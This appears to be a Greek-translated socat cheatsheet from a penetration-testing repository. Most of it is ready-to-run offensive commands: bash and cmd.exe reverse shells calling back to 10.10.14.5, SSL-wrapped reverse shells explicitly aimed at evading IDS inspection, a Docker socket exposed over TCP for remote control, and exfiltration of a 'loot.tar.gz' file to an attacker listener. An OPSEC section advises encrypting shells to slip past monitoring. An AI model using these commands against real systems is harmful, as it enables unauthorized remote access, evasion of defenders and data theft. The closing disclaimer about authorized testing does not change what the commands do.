<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔄 Socat - Ολοκληρωμένο Cheatsheet

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
  ███████╗ ██████╗  ██████╗ █████╗ ████████╗
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝
  ███████╗██║   ██║██║     ███████║   ██║   
  ╚════██║██║   ██║██║     ██╔══██║   ██║   
  ███████║╚██████╔╝╚██████╗██║  ██║   ██║   
  ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝   
       Multipurpose Relay for Bidirectional Data Transfers & Full TTY Shells
```
<p align="center">
  <img src="https://img.shields.io/badge/Socat-SOcket_CAT-blue?style=for-the-badge" alt="Socat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Exploitation & Shells">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP_SSL_UNIX-green?style=for-the-badge" alt="Protocols">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="License GPLv2">
</p>

<p align="center">
  <b>🌐 Δημιουργήστε δύο αμφίδρομες ροές byte και μεταφέρετε δεδομένα μεταξύ αρχείων, σωλήνων, συσκευών, υποδοχών και σηράγγων SSL</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Overview & The Socat Architecture](#-overview--the-socat-architecture)
- [Σύγκριση Socat vs Netcat](#-socat-vs-netcat-comparison)
- [Εγκατάσταση] (#-εγκατάσταση)
- [Πλήρως διαδραστικά αντίστροφα κελύφη TTY](#-fully-interactive-tty-reverse-shells)
  - [Ακρόαση επιτιθέμενου (RAW TTY)](#attacker-listener-raw-tty)
  - [Target Payload (Pty Spawn)](#target-payload-pty-spawn)
  - [Windows Target Reverse Shell](#windows-target-reverse-shell)
- [Κρυπτογραφημένα αντίστροφα κελύφη μέσω SSL/TLS](#-encrypted-reverse-shells-via-ssltls)
  - [Δημιουργία πιστοποιητικών](#generating-certificates)
  - [Κρυπτογραφημένος ακροατής και σύνδεση](#encrypted-listener--connection)
- [Προώθηση θύρας και ρελέ δικτύου] (#-port-forwarding--network-relays)
  - [Local Port Forwarding](#local-port-forwarding)
  - [Forking Listener (Multi-Client)](#forking-listener-multi-client)
  - [Υποδοχή UNIX Domain to TCP Relay (Docker Forwarding)](#unix-domain-socket-to-tcp-relay-docker-forwarding)
- [Μεταφορές αρχείων με το Socat](#-file-transfers-with-socat)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Defensive Considerations & OPSEC](#-defensive-considerations--opsec)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)

---

## 🎯 Επισκόπηση & The Socat Architecture

Το **Socat** (SOcket CAT) είναι ένα βοηθητικό πρόγραμμα που βασίζεται στη γραμμή εντολών που δημιουργεί δύο αμφίδρομες ροές byte και μεταφέρει δεδομένα μεταξύ τους. Επειδή οι ροές μπορούν να κατασκευαστούν από ένα τεράστιο σύνολο τύπων διευθύνσεων (αρχεία, σωλήνες, συσκευές, υποδοχές TCP/UDP, SSL, raw IP, SOCKS4, υποδοχές τομέα UNIX), το Socat περιγράφεται συχνά ως Netcat σε στεροειδή.

Σε δοκιμές διείσδυσης και Red Teaming, η Socat είναι θρυλική για δύο βασικές υπερδυνάμεις:
1. **Στιγμιαία πλήρως διαδραστικά αντίστροφα κελύφη TTY:** Δημιουργία αληθινών ψευδοτερματικών (`pty`) με έλεγχο εργασιών, πλήκτρα βέλους και αυτόματη συμπλήρωση χωρίς να χρειάζεται γυμναστική Python ή `stty raw -echo`.
2. **Κρυπτογραφημένες σήραγγες δικτύου SSL/TLS:** Παράκαμψη τυπικής επιθεώρησης IDS με κρυπτογράφηση ωφέλιμων φορτίων καθαρού κειμένου μέσω SSL.

---

## ⚖️ Σύγκριση Socat εναντίον Netcat

| Χαρακτηριστικό | Netcat (`nc`) | Nmap `ncat` | Socat (`socat`) |
|---------|---------------|-------------|-----------------|
| **Native PTY Shell Spawn** | ❌ Όχι | ❌ Όχι | ✅ Εγγενής (`pty,stderr,setsid`) |
| **Κρυπτογράφηση SSL / TLS ** | ❌ Όχι | ✅ Ναι (`--ssl`) | ✅ Εγγενής (`OPENSSL-LISTEN`, `OPENSSL`) |
| **Διαχύσιμο Ρελέ πολλαπλών πελατών**| ❌ Όχι | ❌ Όχι | ✅ Εγγενής (`fork,reuseaddr`) |
| **Υποδοχές τομέα UNIX** | ❌ Όχι | ✅ Περιορισμένη | ✅ Εγγενής (`UNIX-LISTEN`, `UNIX-CONNECT`) |
| **Μέγεθος δυαδικού αρχείου** | Ελάχιστο (~40 KB) | Μέτρια (~500 KB) | Μέτρια (~400 KB αυτόνομη) |
| **Σύνταξη εντολών** | Απλές σημαίες (`-lvnp`) | Με βάση τη σημαία (`-lvnp`) | Σύνταξη ροής (`<type>:<args>`) |

---

## 📥 Εγκατάσταση
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y socat

# Arch Linux
sudo pacman -S socat

# RedHat / CentOS / Fedora
sudo dnf install -y socat
```
---

## 💀 Πλήρως διαδραστικά αντίστροφα κοχύλια TTY

Όταν πιάνετε ένα αντίστροφο κέλυφος με το τυπικό Netcat, λαμβάνετε ένα ασταθές ανόητο κέλυφος. Το Socat επιτρέπει ένα 100% σταθερό, πλήρως διαδραστικό ψευδοτερματικό με συμπλήρωση Tab, χειρισμό Ctrl+C και υποστήριξη επεξεργασίας οθόνης (`vim`, `nano`).

### Ακροατής επίθεσης (RAW TTY)
```bash
# Listen on port 4444 and hook stdin/stdout directly to your current raw terminal
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
> [!ΣΗΜΕΙΩΣΗ]
> Το `file:`tty`,raw,echo=0` θέτει το τοπικό σας τερματικό σε κατάσταση raw και απενεργοποιεί την ηχώ χαρακτήρων. Εάν η σύνδεση κλείσει απροσδόκητα και το τερματικό σας δεν αποκρίνεται, πληκτρολογήστε `reset` και πατήστε Enter.

### Στόχος ωφέλιμου φορτίου (Pty Spawn)
```bash
# Target connects back, spawning a fully interactive PTY bash shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```
#### Ανάλυση επιλογών:
- `pty`: Εκχωρεί ένα ψευδοτερματικό στο σύστημα προορισμού.
- `stderr`: Ανακατευθύνει το τυπικό σφάλμα στην υποδοχή.
- `setsid`: Εκτελεί τη διαδικασία σε μια νέα ομάδα συνεδρίας (αποτρέπει τη θανάτωση όταν ο γονέας αποχωρεί).
- `sigint`: Περνά σήματα διακοπής (Ctrl+C) στην απομακρυσμένη διαδικασία αντί να σκοτώνει τη συνεδρία.
- `sane`: Επαναφέρει τις ρυθμίσεις ελέγχου τερματικού στις τυπικές προεπιλογές.

### Windows Target Reverse Shell
```bash
# Attacker listener
socat -d -d TCP-LISTEN:4444 STDOUT

# Windows Target connection
socat TCP:10.10.14.5:4444 EXEC:cmd.exe
```
---

## 🔐 Κρυπτογραφημένα αντίστροφα κελύφη μέσω SSL/TLS

Αποτρέψτε την παρακολούθηση της ασφάλειας δικτύου (NSM), το Zeek και το Snort από την επιθεώρηση του ωφέλιμου φορτίου του αντίστροφου κελύφους κρυπτογραφώντας την κίνηση με ένα εφήμερο πιστοποιητικό SSL/TLS.

### Δημιουργία πιστοποιητικών
```bash
# 1. Generate private key and self-signed certificate on attacker machine
openssl req -newkey rsa:2048 -nodes -keyout /tmp/socat.key -x509 -days 365 -out /tmp/socat.crt -subj "/CN=corp-update.local"

# 2. Combine key and cert into a single PEM bundle
cat /tmp/socat.key /tmp/socat.crt > /tmp/socat.pem
```
### Κρυπτογραφημένη συσκευή ακρόασης και σύνδεση
```bash
# 1. Attacker starts an SSL listener
socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:4443,cert=/tmp/socat.pem,verify=0

# 2. Target connects back over SSL
socat OPENSSL:10.10.14.5:4443,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
```
---

## 🔀 Port Forwarding & Network Relays

Το Socat μπορεί να προωθήσει την εισερχόμενη κίνηση από μια διεπαφή δικτύου ή μια θύρα απευθείας σε διαφορετικό απομακρυσμένο στόχο.

### Τοπική προώθηση λιμένων
```bash
# Forward incoming connections on port 8080 to an internal database server
socat TCP-LISTEN:8080,fork TCP:192.168.1.50:3306
```
### Forking listener (Πολλαπλοί πελάτες)

Η επιλογή `fork` επιτρέπει στο Socat να δημιουργεί μια θυγατρική διαδικασία για κάθε νέα εισερχόμενη σύνδεση, διατηρώντας τον κύριο ακροατή ανοιχτό:
```bash
# Multi-client HTTP proxy relay
socat TCP-LISTEN:80,fork,reuseaddr TCP:10.10.10.200:80
```
### Υποδοχή τομέα UNIX σε αναμετάδοση TCP (Προώθηση Docker)

Κατά την πρόσβαση σε μια τοπική υποδοχή Docker daemon (`/var/run/docker.sock`) χωρίς δικαιώματα root στο δίκτυο:
```bash
# Expose Docker UNIX socket over TCP port 2375
socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock

# Connect remotely from attacker machine
docker -H tcp://10.10.10.50:2375 ps
```
---

## 📁 Μεταφορές αρχείων με το Socat
```bash
# 1. Attacker prepares receiving listener
socat -u TCP-LISTEN:9001,reuseaddr OPEN:loot.tar.gz,creat

# 2. Target sends file to attacker
socat -u OPEN:loot.tar.gz TCP:10.10.14.5:9001
```
*(Η σημαία `-u` καθορίζει τη λειτουργία μονής κατεύθυνσης από την πρώτη διεύθυνση στη δεύτερη).*

---

## ⚡ Γρήγορος Πίνακας Αναφοράς

| Στόχος | Εντολή |
|-----------|---------|
| **Διαδραστικός ακροατής TTY** | `socat file:\`tty\`,raw,echo=0 tcp-listen:<PORT>` |
| **Διαδραστικό ωφέλιμο φορτίο TTY** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>` |
| **Κρυπτογραφημένος ακροατής SSL** | `socat file:\`tty\`,raw,echo=0 OPENSSL-LISTEN:<PORT>,cert=<PEM>,verify=0` |
| **Κρυπτογραφημένο ωφέλιμο φορτίο SSL** | `socat OPENSSL:<IP>:<PORT>,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane` |
| **Προώθηση θύρας (Ρελέ)** | `socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:<RHOST>:<RPORT>` |
| **Εκθέστε την υποδοχή UNIX** | `socat TCP-LISTEN:<PORT>,fork UNIX-CLIENT:<SOCKET_PATH>` |
| **Μεταφορά αρχείων (Δέκτης)** | `socat -u TCP-LISTEN:<PORT> OPEN:<OUTFILE>,creat` |
| **Μεταφορά αρχείων (Αποστολέας)** | `socat -u OPEN:<INFILE> TCP:<IP>:<PORT>` |

---

## 🛡️ Αμυντικές Θεωρήσεις & OPSEC

1. **Κρυπτογράφηση κυκλοφορίας:** Τα αντίστροφα κελύφη TCP Cleartext εκθέτουν εντολές σε IDS/IPS. Χρησιμοποιείτε πάντα `OPENSSL-LISTEN` και `OPENSSL` κατά τη διάρκεια των δεσμεύσεων της κόκκινης ομάδας.
2. **Παρακολούθηση διαδικασίας:** Οι πλατφόρμες Sysmon / EDR επισημαίνουν εντολές που επικαλούνται το `pty,stderr,setsid` ως άμεσο ευρετικό αντίστροφου κελύφους.
3. **Ανεξάρτητα δυαδικά:** Κατά την ανάπτυξη σε συστήματα προορισμού, χρησιμοποιήστε στατικά μεταγλωττισμένα αυτόνομα δυαδικά αρχεία Socat για να αποφύγετε τις εξαρτήσεις κοινής βιβλιοθήκης.

---

## ⚠️ Νομική αποποίηση ευθύνης

> [!ΠΡΟΣΟΧΗ]
> Αυτό το cheatsheet προορίζεται μόνο για εξουσιοδοτημένες δοκιμές διείσδυσης, αξιολογήσεις ασφαλείας και ακαδημαϊκή έρευνα. Η μη εξουσιοδοτημένη πρόσβαση σε συστήματα υπολογιστών και η παραβίαση δικτύου είναι αυστηρά παράνομη.